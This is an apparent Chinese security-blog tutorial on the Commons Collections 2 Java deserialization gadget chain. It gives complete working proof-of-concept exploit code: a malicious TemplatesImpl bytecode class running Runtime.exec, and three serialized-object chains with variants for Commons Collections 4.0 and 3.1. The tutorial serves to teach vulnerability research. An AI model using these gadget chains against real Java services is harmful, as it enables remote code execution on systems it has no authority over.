## 前言

前面分析了`CC1`的利用链，在`JDK1.8
8u71`版本以后，对`AnnotationInvocationHandler`的`readobject`进行了改写。导致高版本中利用链无法使用。然后又分析了`CC6`的利用链。解决了`CC1`的高版本JDK利用问题。

 **传送门**

[JAVA反序列入门篇-CommonsCollections1分析](https://www.freebuf.com/vuls/325843.html)

[JAVA反序列篇-CommonsCollecion6分析](https://keepaha.com/2022/03/23/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollecion6%E5%88%86%E6%9E%90/#toc-heading-3)

那为什么需要学习`CommonsCollections2`呢？

  * 学习新的利用方式，竟然CC2是在CC6之前出来的，那肯定有不同的姿势，学习CC2是如何绕过CC1的高版本限制。

  * `CommonsCollection2`为何在`CommonsCollections 3.2.1-3.1`版本不能去使用，又如何解决呢？

  * 在`CommonsCollections-4.0`版本中，删除了`lazyMap`的`decorate`方法，我们又怎么解决呢？

## 前置知识

### ①javassist

通常我们需要将`.java`编译成`.class`才能正常运行，在命令行中我们通常使用`javac`来进行编译，利用编译生成的固定格式的字节码(.class)
来供jvm虚拟机进行使用，每一个class文件中都包含着一个java类或一个接口。

`javassist`就是一个处理字节码的类库，能够动态的修改class中的字节码。在 Javassist 中，类`Javaassit.CtClass`表示
class 文件。一个 GtClass (编译时类）对象可以处理一个 class 文件。

 **例子**

    
    
    ClassPool pool = ClassPool.getDefault();
    CtClass cc = pool.get("com.Test1");
    cc.setSuperclass(pool.get("com.Test2"));
    cc.writeFile();
    

ClassPool 是一个存储 CtClass 的 Hash 表，类的名称作为 Hash 表的 key。ClassPool 的 get() 函数用于从
Hash 表中查找 key 对应的 CtClass 对象。如果没有找到，get() 函数会创建并返回一个新的 CtClass 对象，这个新对象会保存在
Hash 表中。

  * `getDefault()`方法返回了默认的类池（默认的类池搜索系统搜索路径，通常包括平台库、扩展库以及由-classpath选项或CLASSPATH环境变量指定的搜索路径）

  * `get() `方法来`ClassPool`中获得一个`com.Test1`类的`CtClass`对象的引用，并将其赋值给变量 cc

  * `setSuperclass`方法将`com.Test1`的父类被设置为`com.Test2`

  * `writeFile() `方法会将修改后的`CtClass`对象转换成类文件并写到本地磁盘

对比一下原本和新的class文件：

![image](https://image.3001.net/images/20220325/1648191981_623d69edb73edd6e2188a.png!small)

![image](https://image.3001.net/images/20220325/1648192012_623d6a0ce9cccf8dc3074.png!small)

再介绍几个方法：

  * `makeClass()`和`makeInterface()`

    
    
    //创建名为Evil的类
    CtClass test = pool.makeClass("Evil");
    
    //创建名为Evil的接口
    CtClass test = pool.makeInterface("Evil");
    

  * `makeClassInitializer()`

    
    
    #创建一个空的类初始化器（静态构造函数）
    CtConstructor constructor = test.makeClassInitializer();
    

### ②ClassLoader

`ClassLoader`是Java的类加载器，负责将 **字节码转化成内存中的Java类，**

我们这里可以利用类加载器的`defineClass`方法来加载我们的字节码。

    
    
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import javassist.*;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    
    import java.io.FileInputStream;
    import java.io.FileNotFoundException;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    
    public class CommmonsCollections2 {
    
        public static void main(String[] args) throws IOException, ClassNotFoundException, CannotCompileException, NotFoundException, InvocationTargetException, IllegalAccessException, InstantiationException, NoSuchMethodException {
    
            ClassPool pool = ClassPool.getDefault();
            CtClass test = pool.makeClass("Evil");
            test.setSuperclass(pool.get("Test"));
            test.writeFile("./");
            byte[] bytes = test.toBytecode();
            Class clas = Class.forName("java.lang.ClassLoader");
            Method defineclass = clas.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            defineclass.setAccessible(true);
            Class claz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),"Evil",bytes,0,bytes.length);
            Test e = (Test) claz.newInstance();
            e.hello();
        }
    }
    
    
    
    public class Test {
    
        public static void main(String[] args) {
    
        }
        public void hello(){
            System.out.println("hello Test");
        }
    }
    

![image](https://image.3001.net/images/20220325/1648192041_623d6a293866224179f06.png!small)

**注：后面有用**

这里需要注意的是，`ClassLoader#defineClass`返回的类并不会初始化，只有这个对象显式地调用其构造函数初始化代码才能被执行，所以我们需要想办法调用返回的类的构造函数才能执行命令。

### ③TemplatesImpl

在`TemplatesImpl`类中定义了一个内部类`defineClass`，这个类中对`defineClass`进行了重写，并且没有显式的对定义域进行声明，可以被外部进行调用。

![image](https://image.3001.net/images/20220325/1648192053_623d6a35747696461f381.png!small)

这个类的特别之处就是,在调用他的`newTransformer`或者`getOutputProperties`时,会动态从字节码中重建一个类。这就使得如果我们能操作字节码,
就能在创建类时执任意 java 代码。

 **TemplatesImpI类分析**

写贴一个半成品 **链条**

    
    
    TemplatesImpl.newTransformer()
    	TemplatesImpl.getTransletInstance()
    		TemplatesImpl.defineTransletClasses()
    			TransletClassLoader.defineClass()
    				TemplatesImpl.getTransletInstance()->_class[_transletIndex].newInstance()
    					Runtime.getRuntime().exec("calc.exe")
    

`TemplatesImpl.newTransformer()`调用`getTransletInstance()`

![image](https://image.3001.net/images/20220325/1648192068_623d6a44a9f4b99d17276.png!small)

跟进`getTransletInstance()`方法，当`_name`不为null且`_class`为null,触发`defineTransletClasses()`方法。

![image](https://image.3001.net/images/20220325/1648192079_623d6a4f1fddbbd2925d9.png!small)

跟进`defineTransletClasses()`方法，`_bytecodes`设置为我们要读取的字节码，就是传进去的 **恶意字节码**
。也需要设置`_tfactory`不然就会返回null，无法到达触发点。`_tfactory`是`TransformerFactoryImpl`类，所以我们只需要传入`new
TransformerFactoryImpl()`就可以了。

![image](https://image.3001.net/images/20220325/1648192089_623d6a59677b51ed589a5.png!small)

![image](https://image.3001.net/images/20220325/1648192099_623d6a63b0c815b67ab73.png!small)

`loader.defineClass`将字节码转化成内存中的Java类。然后获取当前`_class`的`getSuperclass()`超类，就是恶意字节码的超类。再进行判断这个超类是不是等于`ABSTRACT_TRANSLET`，如果相等执行if里面的`_transletIndex`赋值操作。

![image](https://image.3001.net/images/20220325/1648192111_623d6a6f8aa77714dbc7c.png!small)

查看下`ABSTRACT_TRANSLET`可以看到指向的是`AbstractTranslet`类，所以我们的恶意类也要继承`AbstractTranslet`类。

![image](https://image.3001.net/images/20220325/1648192122_623d6a7aa3ba377a87776.png!small)

 **构造恶意类**

    
    
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    
    public class Evil  extends AbstractTranslet {
        static {
            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (Exception e) {}
        }
    
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
        }
    }
    

**测试POC**

    
    
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.*;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    
    import javax.xml.transform.TransformerConfigurationException;
    import java.io.FileInputStream;
    import java.io.FileNotFoundException;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    
    public class CommmonsCollections2 {
    
        public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException {
    
            TemplatesImpl templates=new TemplatesImpl();
            //获取TemplatesImpl的Class
            Class tc=templates.getClass();
            Field nameField=tc.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates,"aaaa");
            Field bytecodesField=tc.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            //加载恶意类
            byte[] code = Files.readAllBytes(Paths.get("D:\\test\\CommonsCollections2\\out\\production\\CommonsCollections2\\Evil.class"));
            byte[][] codes={code};
            bytecodesField.set(templates,codes);
    
            Field tfactoryField=tc.getDeclaredField("_tfactory");
            tfactoryField.setAccessible(true);
            tfactoryField.set(templates,new TransformerFactoryImpl());
            //调用
            templates.newTransformer();
        }
    }
    

**成功弹出计算器**

![image](https://image.3001.net/images/20220325/1648192138_623d6a8a8ee5432c3bde1.png!small)

漏洞执行点，`TemplatesImpl.getTransletInstance()->_class[_transletIndex].newInstance()`初始化恶意类，执行恶意代码。

![image](https://image.3001.net/images/20220325/1648192166_623d6aa6c640f18b003e6.png!small)

## Gadget链条分析

    
    
    Gadget chain:
    	PriorityQueue.readObject()
    		PriorityQueue.heapify()
    			PriorityQueue.siftDown()
    				TransformingComparator.compare()
    						InvokerTransformer.transform()
    							Method.invoke()
    								TemplatesImpl.newTransformer()
                                        TemplatesImpl.getTransletInstance()
                                            TemplatesImpl.defineTransletClasses()
                                                TransletClassLoader.defineClass()
                                                    newInstance()
                                                        Runtime.getRuntime().exec("calc.exe")
    

上面我们已经分析了后半部分链条，现在分析下如何触发`TemplatesImpl.newTransformer()`，利用到一个新的类`TransformingComparator`，看下构造方法和触发的方法。

`TransformingComparator`类和`ChainedTransformer`类相似，都是通过触发`this.xxx.transform()`方法去触发，`InvokerTransformer.transform()`方法，然后执行`TemplatesImpl.newTransformer()`完成链条的利用。

![image](https://image.3001.net/images/20220325/1648192182_623d6ab60c62a17e55d14.png!small)

下一步继续往前推，如何触发`TransformingComparator.compare()`方法。

 **PriorityQueue类**

优先队列`PriorityQueue`是`Queue`接口的实现，可以对其中元素进行排序。此类重写了`readObject`方法，跟进下。

对传入的`ObjectInputStream`进行反序列化然后赋值给`queue`数组，然后`heapify()`进行排序。

![image](https://image.3001.net/images/20220325/1648192195_623d6ac35b2615f6af763.png!small)

跟进`heapify()`方法，调用`siftDown()`方法，`queue[i]`是我们可控的。

![image](https://image.3001.net/images/20220325/1648192205_623d6acdea483bb219dd3.png!small)

跟进`siftDown()`方法，`comparator`不为null，调用`siftDownUsingComparator()`方法。

![image](https://image.3001.net/images/20220325/1648192223_623d6adf29df4eb2f5db2.png!small)

跟进`siftDownUsingComparator()`方法，调用了`comparator.compare()`方法,
同时`x`可控，我们利用反射设置`comparator`为`TransformingComparator`类就行。

![image](https://image.3001.net/images/20220325/1648192237_623d6aed0ae9322cc0cc3.png!small)

 **最终POC代码**

    
    
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.*;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    
    import javax.xml.transform.TransformerConfigurationException;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.PriorityQueue;
    
    public class CommmonsCollections2 {
    
        public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException {
    
            TemplatesImpl templates=new TemplatesImpl();
            //获取TemplatesImpl的Class
            Class tc=templates.getClass();
            Field nameField=tc.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates,"aaaa");
            Field bytecodesField=tc.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            //加载恶意类
            byte[] code = Files.readAllBytes(Paths.get("D:\\test\\CommonsCollections2\\out\\production\\CommonsCollections2\\Evil.class"));
            byte[][] codes={code};
            bytecodesField.set(templates,codes);
    
            Field tfactoryField=tc.getDeclaredField("_tfactory");
            tfactoryField.setAccessible(true);
            tfactoryField.set(templates,new TransformerFactoryImpl());
    
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{}),
    
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
            //长度是2才能满足条件
            PriorityQueue queue = new PriorityQueue();
            queue.add(1);
            queue.add(2);
            //修改comparator属性
            Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            field.setAccessible(true);
            field.set(queue,transformingComparator);
            //序列化
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("./cc2.ser"));
            objectOutputStream.writeObject(queue);
            objectOutputStream.close();
            //反序列化
            ObjectInputStream objectInputStream =new ObjectInputStream(new FileInputStream("./cc2.ser"));
            objectInputStream.readObject();
            objectInputStream.close();
        }
    }
    

![image](https://image.3001.net/images/20220325/1648192255_623d6aff5f7079f23eb92.png!small)

## 问题解答

 **在`CommonsCollections-4.0`版本中，删除了`lazyMap`的`decorate`方法，我们怎么解决呢？**

 **环境**

    
    
    CommonsColections 4.0
    JDk8u_101
    

虽然在4版本中删除了`decorate`方法，但还有另外一个构造方法`LazyMap`，可以直接让传进的`Transformer`赋值给`this.factory`。

![image](https://image.3001.net/images/20220325/1648192280_623d6b18a2cf3603c1b6a.png!small)

 **Gadget链条**

    
    
    Gadget chain:
        ObjectInputStream.readObject()
            HashMap.readObject()
                HashMap.hash()
                    TiedMapEntry.hashCode()
                        TiedMapEntry.getValue()
                            LazyMap.get()
                                ChainedTransformer.transform()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            TemplatesImpl.newTransformer()
                                                TemplatesImpl.getTransletInstance()
                                                    TemplatesImpl.defineTransletClasses()
                                                        TransletClassLoader.defineClass()
                                                            newInstance()
                                                                Runtime.getRuntime().exec("calc.exe")
    

**最终POC代码**

    
    
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.*;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import org.apache.commons.collections4.keyvalue.TiedMapEntry;
    import org.apache.commons.collections4.map.LazyMap;
    
    
    import javax.xml.transform.TransformerConfigurationException;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.HashMap;
    import java.util.Map;
    
    public class CommmonsCollections2 {
    
        public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
    
            TemplatesImpl templates=new TemplatesImpl();
            //获取TemplatesImpl的Class
            Class tc=templates.getClass();
            Field nameField=tc.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates,"aaaa");
            Field bytecodesField=tc.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            //加载恶意类
            byte[] code = Files.readAllBytes(Paths.get("D:\\test\\CommonsCollections2\\out\\production\\CommonsCollections2\\Evil.class"));
            byte[][] codes={code};
            bytecodesField.set(templates,codes);
    
            Field tfactoryField=tc.getDeclaredField("_tfactory");
            tfactoryField.setAccessible(true);
            tfactoryField.set(templates,new TransformerFactoryImpl());
    
            Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{}),
    
            };
    
            Transformer transformerChain = new ChainedTransformer(fakeTransformers);
            Map innerMap = new HashMap();
    
            Class clazz = LazyMap.class;
            Constructor construct =  clazz.getDeclaredConstructor(Map.class, Transformer.class);
            construct.setAccessible(true);
            Map outerMap = (Map) construct.newInstance(innerMap, transformerChain);
    
            TiedMapEntry tme = new TiedMapEntry(outerMap, "eas1");
            Map expMap = new HashMap();
            expMap.put(tme, "eas2");
            outerMap.remove("eas1");
            //把真正的transformers数组换回来
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);
            //序列化
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("./test.ser"));
            objectOutputStream.writeObject(expMap);
            objectOutputStream.close();
            //反序列化
            ObjectInputStream objectInputStream =new ObjectInputStream(new FileInputStream("./test.ser"));
            objectInputStream.readObject();
            objectInputStream.close();
    
        }
    }
    

![image](https://image.3001.net/images/20220325/1648192300_623d6b2c6037bd3184317.png!small)

![image](https://image.3001.net/images/20220325/1648192309_623d6b359aabba4aefb27.png!small)

**`CommonsCollection2`为何在`CommonsCollections3.1-3.2.1`版本不能去使用，又如何解决呢？**

 **环境**

    
    
    CommonsCollections 3.1
    JDK8u_101
    

因为在`3.1-3.2.1`版本中`TransformingComparator`没有实现`Serializable`接口，所以就没法被序列化/反序列化。

![image](https://image.3001.net/images/20220325/1648192323_623d6b43f0926baebf1ca.png!small)

 **解决**

利用`LazyMap.get()`方法触发`InvokerTransformer.transform()`，其实还是`URLDNS+CC1+CC2`拼接来的。

 **Gadget链条**

    
    
    Gadget chain:
        ObjectInputStream.readObject()
            HashMap.readObject()
                HashMap.hash()
                    TiedMapEntry.hashCode()
                        TiedMapEntry.getValue()
                            LazyMap.get()
                                ChainedTransformer.transform()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            TemplatesImpl.newTransformer()
                                                TemplatesImpl.getTransletInstance()
                                                    TemplatesImpl.defineTransletClasses()
                                                        TransletClassLoader.defineClass()
                                                            newInstance()
                                                                Runtime.getRuntime().exec("calc.exe")
    

**最终POC代码**

    
    
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.*;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    
    import javax.xml.transform.TransformerConfigurationException;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.HashMap;
    import java.util.Map;
    
    public class CommmonsCollections2 {
    
        public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException {
    
            TemplatesImpl templates=new TemplatesImpl();
            //获取TemplatesImpl的Class
            Class tc=templates.getClass();
            Field nameField=tc.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates,"aaaa");
            Field bytecodesField=tc.getDeclaredField("_bytecodes");
            bytecodesField.setAccessible(true);
            //加载恶意类
            byte[] code = Files.readAllBytes(Paths.get("D:\\test\\CommonsCollections2\\out\\production\\CommonsCollections2\\Evil.class"));
            byte[][] codes={code};
            bytecodesField.set(templates,codes);
    
            Field tfactoryField=tc.getDeclaredField("_tfactory");
            tfactoryField.setAccessible(true);
            tfactoryField.set(templates,new TransformerFactoryImpl());
            //调用
            //templates.newTransformer();
    
    
            Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
    
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{}),
    
            };
    
            Transformer transformerChain = new ChainedTransformer(fakeTransformers);
            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, transformerChain);
            TiedMapEntry tme = new TiedMapEntry(outerMap, "eas1");
            Map expMap = new HashMap();
            expMap.put(tme, "eas2");
            outerMap.remove("eas1");
            //把真正的transformers数组换回来
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);
            //序列化
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("./test.ser"));
            objectOutputStream.writeObject(expMap);
            objectOutputStream.close();
            //反序列化
            ObjectInputStream objectInputStream =new ObjectInputStream(new FileInputStream("./test.ser"));
            objectInputStream.readObject();
            objectInputStream.close();
    
        }
    }
    

![image](https://image.3001.net/images/20220325/1648192340_623d6b54aea7ddd063bc8.png!small)

![image](https://image.3001.net/images/20220325/1648192351_623d6b5f0dd26f2cb6bf3.png!small)

## 总结

很多链条单独使用往往局限性都很高，但是几条链条互相弥补对方的不足之处就会重新变成一条通用性很高的链条。学完一条链条后，应该多思考思考链条与链条之间的关系，让其发挥更大的作用。没有什么垃圾的利用链，每一条利用链存在都一定有它的作用。一条利用链能发挥多大的作用就看使用他的人如何了。

`URLDNS、CC1、CC2、CC6`，当这4条链分开使用，每一条都有其局限限。要么`JDK`版本限制，要么`CommonsCollections`版本限制，当把它们组合在一起，所有问题都迎刃而解了。

以上是作者自己的见解，有错之处望大家指点。

## 参考文章

[Java反序列化-CommonsCollections2分析](https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&mid=2247483897&idx=1&sn=b8d6b00abc2c8be1abafd30814f9f9d6&chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&mpshare=1&scene=23&srcid=0323jXdEcEHNJge9w3mo70Dd&sharer_sharetime=1648029968549&sharer_shareid=dc36502b1594ec1d7af81618398b34e5#rd)

[Javassist 使用指南（一）](https://www.jianshu.com/p/43424242846b)

[CommonsCollections2分析](https://blog.csdn.net/weixin_43818995/article/details/122184245)

